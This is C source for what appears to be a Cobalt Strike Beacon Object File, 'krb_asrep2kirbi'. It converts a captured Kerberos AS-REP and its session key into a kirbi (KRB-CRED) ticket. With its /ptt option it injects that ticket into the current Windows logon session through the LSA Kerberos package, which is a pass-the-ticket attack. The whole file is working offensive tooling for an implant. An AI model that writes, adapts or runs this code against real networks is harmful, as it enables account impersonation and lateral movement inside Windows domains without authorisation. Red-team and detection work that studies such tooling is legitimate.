/*
 * krb_asrep2kirbi - Convert AS-REP to Kirbi Format
 *
 * Converts a raw AS-REP response to the KRB-CRED (kirbi) format that can
 * be imported into Windows using pass-the-ticket.
 *
 * Usage: krb_asrep2kirbi /asrep:BASE64 /key:SESSION_KEY [/etype:ETYPE] [/ptt]
 *
 * Note: Requires the session key from the AS-REP decryption
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Helper: allocate and base64 decode using krb5_utils functions */
static BYTE* b64_decode_alloc(const char* encoded, size_t* out_len) {
    size_t len = strlen(encoded);
    size_t max_out = len / 4 * 3 + 1;
    BYTE* decoded = (BYTE*)malloc(max_out);
    if (!decoded) return NULL;

    *out_len = base64_decode(encoded, len, decoded);
    if (*out_len == 0) {
        free(decoded);
        return NULL;
    }
    return decoded;
}

/* Parse hex string to bytes */
static BYTE* hex_to_bytes(const char* hex, size_t* out_len) {
    size_t len = strlen(hex);
    if (len % 2 != 0) return NULL;

    *out_len = len / 2;
    BYTE* bytes = (BYTE*)malloc(*out_len);
    if (!bytes) return NULL;

    for (size_t i = 0; i < *out_len; i++) {
        char byte_str[3] = { hex[i*2], hex[i*2+1], '\0' };
        bytes[i] = (BYTE)strtoul(byte_str, NULL, 16);
    }

    return bytes;
}

/* Extract ticket from AS-REP */
static int extract_ticket_from_asrep(BYTE* asrep, size_t asrepLen,
                                      BYTE** ticketOut, size_t* ticketLenOut,
                                      formatp* output) {
    /*
     * AS-REP ::= [APPLICATION 11] SEQUENCE {
     *   pvno [0] INTEGER
     *   msg-type [1] INTEGER
     *   padata [2] SEQUENCE OF PA-DATA OPTIONAL
     *   crealm [3] Realm
     *   cname [4] PrincipalName
     *   ticket [5] Ticket        <-- We want this
     *   enc-part [6] EncryptedData
     * }
     */

    if (asrep[0] != 0x6B) {  /* APPLICATION 11 */
        BeaconFormatPrintf(output, "[-] Not an AS-REP (expected 0x6B, got 0x%02X)\n", asrep[0]);
        return 0;
    }

    size_t offset = 1;
    size_t totalLen = asn1_decode_length(asrep, &offset);
    (void)totalLen;

    /* Should be a SEQUENCE */
    if (asrep[offset] != ASN1_SEQUENCE) {
        BeaconFormatPrintf(output, "[-] Expected SEQUENCE in AS-REP\n");
        return 0;
    }
    offset++;
    asn1_decode_length(asrep, &offset);

    /* Look for context tag [5] (ticket) */
    while (offset < asrepLen - 4) {
        if (asrep[offset] == 0xA5) {  /* Context [5] */
            size_t ticketWrapOffset = offset + 1;
            size_t ticketWrapLen = asn1_decode_length(asrep, &ticketWrapOffset);

            /* The ticket itself starts here */
            if (asrep[ticketWrapOffset] == 0x61) {  /* APPLICATION 1 = Ticket */
                *ticketOut = (BYTE*)malloc(ticketWrapLen);
                if (!*ticketOut) return 0;
                memcpy(*ticketOut, asrep + ticketWrapOffset, ticketWrapLen);
                *ticketLenOut = ticketWrapLen;
                return 1;
            }
        }

        /* Skip this element */
        if ((asrep[offset] & 0xE0) == 0xA0) {  /* Context tag */
            offset++;
            size_t elemLen = asn1_decode_length(asrep, &offset);
            offset += elemLen;
        } else {
            offset++;
        }
    }

    BeaconFormatPrintf(output, "[-] Could not find ticket in AS-REP\n");
    return 0;
}

/* Extract crealm and cname from AS-REP */
static int extract_client_info(BYTE* asrep, size_t asrepLen,
                                char* realm, size_t realmMax,
                                char* cname, size_t cnameMax) {
    size_t offset = 1;
    asn1_decode_length(asrep, &offset);

    if (asrep[offset] != ASN1_SEQUENCE) return 0;
    offset++;
    asn1_decode_length(asrep, &offset);

    realm[0] = '\0';
    cname[0] = '\0';

    while (offset < asrepLen - 4) {
        BYTE tag = asrep[offset];

        if (tag == 0xA3) {  /* crealm [3] */
            offset++;
            size_t len = asn1_decode_length(asrep, &offset);
            if (asrep[offset] == ASN1_GENERALSTRING) {
                offset++;
                size_t strLen = asn1_decode_length(asrep, &offset);
                if (strLen < realmMax) {
                    memcpy(realm, asrep + offset, strLen);
                    realm[strLen] = '\0';
                }
                offset += strLen;
            } else {
                offset += len;
            }
        } else if (tag == 0xA4) {  /* cname [4] */
            offset++;
            size_t len = asn1_decode_length(asrep, &offset);
            size_t endOffset = offset + len;

            /* Parse PrincipalName */
            if (asrep[offset] == ASN1_SEQUENCE) {
                offset++;
                asn1_decode_length(asrep, &offset);

                /* Find name-string [1] */
                while (offset < endOffset) {
                    if (asrep[offset] == 0xA1) {
                        offset++;
                        asn1_decode_length(asrep, &offset);

                        if (asrep[offset] == ASN1_SEQUENCE) {
                            offset++;
                            asn1_decode_length(asrep, &offset);

                            /* Read first GeneralString */
                            if (asrep[offset] == ASN1_GENERALSTRING) {
                                offset++;
                                size_t strLen = asn1_decode_length(asrep, &offset);
                                if (strLen < cnameMax) {
                                    memcpy(cname, asrep + offset, strLen);
                                    cname[strLen] = '\0';
                                }
                            }
                        }
                        break;
                    }
                    offset++;
                }
            }
            offset = endOffset;
        } else if ((tag & 0xE0) == 0xA0) {
            offset++;
            size_t len = asn1_decode_length(asrep, &offset);
            offset += len;
        } else {
            offset++;
        }

        if (realm[0] && cname[0]) break;
    }

    return (realm[0] && cname[0]);
}

/* Build KRB-CRED (kirbi) from ticket and session key */
static BYTE* build_krb_cred(BYTE* ticket, size_t ticketLen,
                             BYTE* sessionKey, size_t sessionKeyLen,
                             int etype, const char* realm, const char* cname,
                             size_t* kirbiLenOut, formatp* output) {
    /*
     * KRB-CRED ::= [APPLICATION 22] SEQUENCE {
     *   pvno [0] INTEGER
     *   msg-type [1] INTEGER
     *   tickets [2] SEQUENCE OF Ticket
     *   enc-part [3] EncryptedData (contains EncKrbCredPart)
     * }
     *
     * For kirbi, enc-part is typically "encrypted" with a null key
     * or the session key is embedded in a specific format.
     */

    KRB_BUFFER krbcred, seq, tmp, pvno, msg_type, tickets, enc_part;
    KRB_BUFFER enc_krb_cred_part, ticket_info, key_info;

    buf_init(&krbcred, 8192);
    buf_init(&seq, 8192);
    buf_init(&tmp, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&tickets, ticketLen + 64);
    buf_init(&enc_part, 4096);
    buf_init(&enc_krb_cred_part, 2048);
    buf_init(&ticket_info, 1024);
    buf_init(&key_info, 256);

    /* pvno [0] INTEGER (5) */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&seq, 0, &pvno);

    /* msg-type [1] INTEGER (22 = KRB-CRED) */
    asn1_encode_integer(&msg_type, 22);
    asn1_context_wrap(&seq, 1, &msg_type);

    /* tickets [2] SEQUENCE OF Ticket */
    buf_append(&tmp, ticket, ticketLen);
    asn1_wrap(&tickets, ASN1_SEQUENCE, &tmp);
    asn1_context_wrap(&seq, 2, &tickets);
    buf_reset(&tmp);

    /* Build EncKrbCredPart for enc-part */
    /* This contains the session key and ticket info */
    {
        KRB_BUFFER cred_info, cred_info_seq;
        buf_init(&cred_info, 1024);
        buf_init(&cred_info_seq, 1024);

        /* KrbCredInfo ::= SEQUENCE {
         *   key [0] EncryptionKey
         *   prealm [1] Realm OPTIONAL
         *   pname [2] PrincipalName OPTIONAL
         *   ... (flags, times, etc.)
         * }
         */

        /* key [0] EncryptionKey */
        {
            KRB_BUFFER enc_key, key_type, key_value;
            buf_init(&enc_key, 256);
            buf_init(&key_type, 16);
            buf_init(&key_value, 128);

            asn1_encode_integer(&key_type, etype);
            asn1_context_wrap(&enc_key, 0, &key_type);

            asn1_encode_octet_string(&key_value, sessionKey, sessionKeyLen);
            asn1_context_wrap(&enc_key, 1, &key_value);

            asn1_wrap(&tmp, ASN1_SEQUENCE, &enc_key);
            asn1_context_wrap(&cred_info, 0, &tmp);
            buf_reset(&tmp);

            buf_free(&enc_key);
            buf_free(&key_type);
            buf_free(&key_value);
        }

        /* prealm [1] Realm */
        if (realm[0]) {
            asn1_encode_general_string(&tmp, realm);
            asn1_context_wrap(&cred_info, 1, &tmp);
            buf_reset(&tmp);
        }

        /* pname [2] PrincipalName */
        if (cname[0]) {
            KRB_BUFFER pname, name_type, name_string, name_str_seq;
            buf_init(&pname, 256);
            buf_init(&name_type, 16);
            buf_init(&name_string, 128);
            buf_init(&name_str_seq, 128);

            asn1_encode_integer(&name_type, KRB5_NT_PRINCIPAL);
            asn1_context_wrap(&pname, 0, &name_type);

            asn1_encode_general_string(&tmp, cname);
            asn1_wrap(&name_str_seq, ASN1_SEQUENCE, &tmp);
            asn1_context_wrap(&pname, 1, &name_str_seq);
            buf_reset(&tmp);

            asn1_wrap(&tmp, ASN1_SEQUENCE, &pname);
            asn1_context_wrap(&cred_info, 2, &tmp);
            buf_reset(&tmp);

            buf_free(&pname);
            buf_free(&name_type);
            buf_free(&name_string);
            buf_free(&name_str_seq);
        }

        /* Wrap KrbCredInfo in SEQUENCE */
        asn1_wrap(&cred_info_seq, ASN1_SEQUENCE, &cred_info);

        /* ticket-info [0] SEQUENCE OF KrbCredInfo */
        asn1_wrap(&tmp, ASN1_SEQUENCE, &cred_info_seq);
        asn1_context_wrap(&enc_krb_cred_part, 0, &tmp);
        buf_reset(&tmp);

        buf_free(&cred_info);
        buf_free(&cred_info_seq);
    }


    asn1_wrap(&tmp, ASN1_APP(29), &enc_krb_cred_part);

    /* enc-part [3] EncryptedData (etype 0 = unencrypted for kirbi) */
    {
        KRB_BUFFER enc_data, enc_etype, cipher;
        buf_init(&enc_data, tmp.length + 32);
        buf_init(&enc_etype, 16);
        buf_init(&cipher, tmp.length + 16);

        /* etype [0] = 0 (unencrypted) */
        asn1_encode_integer(&enc_etype, 0);
        asn1_context_wrap(&enc_data, 0, &enc_etype);

        /* cipher [2] OCTET STRING */
        asn1_encode_octet_string(&cipher, tmp.data, tmp.length);
        asn1_context_wrap(&enc_data, 2, &cipher);

        asn1_wrap(&enc_part, ASN1_SEQUENCE, &enc_data);
        asn1_context_wrap(&seq, 3, &enc_part);

        buf_free(&enc_data);
        buf_free(&enc_etype);
        buf_free(&cipher);
    }


    buf_reset(&tmp);
    asn1_wrap(&tmp, ASN1_SEQUENCE, &seq);
    asn1_wrap(&krbcred, ASN1_APP(22), &tmp);


    BYTE* result = (BYTE*)malloc(krbcred.length);
    if (result) {
        memcpy(result, krbcred.data, krbcred.length);
        *kirbiLenOut = krbcred.length;
    }

    buf_free(&krbcred);
    buf_free(&seq);
    buf_free(&tmp);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&tickets);
    buf_free(&enc_part);
    buf_free(&enc_krb_cred_part);
    buf_free(&ticket_info);
    buf_free(&key_info);

    return result;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* asrep_b64 = NULL;
    char* key_hex = NULL;
    char* etype_str = NULL;
    char* ptt = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: AS-REP to Kirbi Conversion\n\n");


    asrep_b64 = arg_get(&parser, "asrep");
    key_hex = arg_get(&parser, "key");
    etype_str = arg_get(&parser, "etype");
    ptt = arg_get(&parser, "ptt");

    if (!asrep_b64) {
        BeaconFormatPrintf(&output, "[-] Error: /asrep:BASE64 required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_asrep2kirbi /asrep:BASE64_ASREP /key:SESSION_KEY_HEX\n");
        BeaconFormatPrintf(&output, "                       [/etype:ENCRYPTION_TYPE] [/ptt]\n\n");
        BeaconFormatPrintf(&output, "Converts a raw AS-REP response to kirbi format for import.\n\n");
        BeaconFormatPrintf(&output, "Options:\n");
        BeaconFormatPrintf(&output, "  /asrep   - Base64 encoded AS-REP from TGT request\n");
        BeaconFormatPrintf(&output, "  /key     - Session key in hex (from decryption)\n");
        BeaconFormatPrintf(&output, "  /etype   - Encryption type (default: 23 for RC4)\n");
        BeaconFormatPrintf(&output, "  /ptt     - Pass-the-ticket after conversion\n\n");
        BeaconFormatPrintf(&output, "Encryption types:\n");
        BeaconFormatPrintf(&output, "  17 = AES128-CTS-HMAC-SHA1\n");
        BeaconFormatPrintf(&output, "  18 = AES256-CTS-HMAC-SHA1\n");
        BeaconFormatPrintf(&output, "  23 = RC4-HMAC\n");
        goto cleanup;
    }


    size_t asrepLen;
    BYTE* asrep = b64_decode_alloc(asrep_b64, &asrepLen);
    if (!asrep) {
        BeaconFormatPrintf(&output, "[-] Failed to decode AS-REP\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] AS-REP size: %d bytes\n", (int)asrepLen);


    if (asrep[0] != 0x6B) {
        BeaconFormatPrintf(&output, "[-] Not an AS-REP (type: 0x%02X)\n", asrep[0]);
        free(asrep);
        goto cleanup;
    }


    char realm[256] = {0};
    char cname[256] = {0};
    if (extract_client_info(asrep, asrepLen, realm, sizeof(realm), cname, sizeof(cname))) {
        BeaconFormatPrintf(&output, "[*] Client: %s@%s\n", cname, realm);
    } else {
        BeaconFormatPrintf(&output, "[!] Could not extract client info\n");
        strcpy(realm, "UNKNOWN");
        strcpy(cname, "unknown");
    }


    BYTE* ticket = NULL;
    size_t ticketLen = 0;
    if (!extract_ticket_from_asrep(asrep, asrepLen, &ticket, &ticketLen, &output)) {
        free(asrep);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Extracted ticket: %d bytes\n", (int)ticketLen);


    BYTE* sessionKey = NULL;
    size_t sessionKeyLen = 0;
    int etype = ETYPE_RC4_HMAC;  /* Default */

    if (key_hex) {
        sessionKey = hex_to_bytes(key_hex, &sessionKeyLen);
        if (!sessionKey) {
            BeaconFormatPrintf(&output, "[-] Invalid session key format\n");
            free(ticket);
            free(asrep);
            goto cleanup;
        }
        BeaconFormatPrintf(&output, "[*] Session key: %d bytes\n", (int)sessionKeyLen);

        /* Determine etype from key length if not specified */
        if (etype_str) {
            etype = atoi(etype_str);
        } else if (sessionKeyLen == 16) {
            etype = ETYPE_RC4_HMAC;
        } else if (sessionKeyLen == 32) {
            etype = ETYPE_AES256_CTS_HMAC_SHA1;
        }
    } else {
        /* Use dummy key if not provided */
        BeaconFormatPrintf(&output, "[!] No session key provided - using placeholder\n");
        BeaconFormatPrintf(&output, "[!] The resulting kirbi may not be usable without valid key\n");
        sessionKeyLen = 16;
        sessionKey = (BYTE*)malloc(sessionKeyLen);
        memset(sessionKey, 0, sessionKeyLen);
    }

    BeaconFormatPrintf(&output, "[*] Encryption type: %d\n", etype);


    size_t kirbiLen;
    BYTE* kirbi = build_krb_cred(ticket, ticketLen, sessionKey, sessionKeyLen,
                                  etype, realm, cname, &kirbiLen, &output);

    free(sessionKey);
    free(ticket);
    free(asrep);

    if (!kirbi) {
        BeaconFormatPrintf(&output, "[-] Failed to build kirbi\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Built kirbi: %d bytes\n", (int)kirbiLen);

    /* Output kirbi */
    char* kirbi_b64 = b64_encode_alloc(kirbi, kirbiLen);
    if (kirbi_b64) {
        BeaconFormatPrintf(&output, "\n[*] Kirbi (base64):\n");
        size_t b64len = strlen(kirbi_b64);
        for (size_t i = 0; i < b64len; i += 76) {
            BeaconFormatPrintf(&output, "  %.76s\n", kirbi_b64 + i);
        }

        /* Pass-the-ticket if requested */
        if (ptt) {
            BeaconFormatPrintf(&output, "\n[*] Attempting to import kirbi...\n");

            HANDLE hLsa = NULL;
            ULONG authPackage = 0;
            NTSTATUS status;
            LSA_STRING kerbName;

            status = SECUR32$LsaConnectUntrusted(&hLsa);
            if (status == 0) {
                kerbName.Buffer = "kerberos";
                kerbName.Length = 8;
                kerbName.MaximumLength = 9;

                status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
                if (status == 0) {
                    KERB_SUBMIT_TKT_REQUEST* submitRequest;
                    ULONG requestSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbiLen;
                    submitRequest = (KERB_SUBMIT_TKT_REQUEST*)malloc(requestSize);

                    if (submitRequest) {
                        memset(submitRequest, 0, sizeof(KERB_SUBMIT_TKT_REQUEST));
                        submitRequest->MessageType = KerbSubmitTicketMessage;
                        submitRequest->KerbCredSize = (ULONG)kirbiLen;
                        submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
                        memcpy((BYTE*)submitRequest + sizeof(KERB_SUBMIT_TKT_REQUEST), kirbi, kirbiLen);

                        PVOID response = NULL;
                        ULONG responseSize = 0;
                        NTSTATUS subStatus;

                        status = SECUR32$LsaCallAuthenticationPackage(
                            hLsa, authPackage, submitRequest, requestSize,
                            &response, &responseSize, &subStatus);

                        if (status == 0 && subStatus == 0) {
                            BeaconFormatPrintf(&output, "[+] Kirbi imported successfully!\n");
                        } else {
                            BeaconFormatPrintf(&output, "[-] Import failed: 0x%08X / 0x%08X\n", status, subStatus);
                        }

                        if (response) SECUR32$LsaFreeReturnBuffer(response);
                        free(submitRequest);
                    }
                }
                SECUR32$LsaDeregisterLogonProcess(hLsa);
            }
        }

        free(kirbi_b64);
    }

    free(kirbi);

cleanup:
    if (asrep_b64) free(asrep_b64);
    if (key_hex) free(key_hex);
    if (etype_str) free(etype_str);
    if (ptt) free(ptt);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
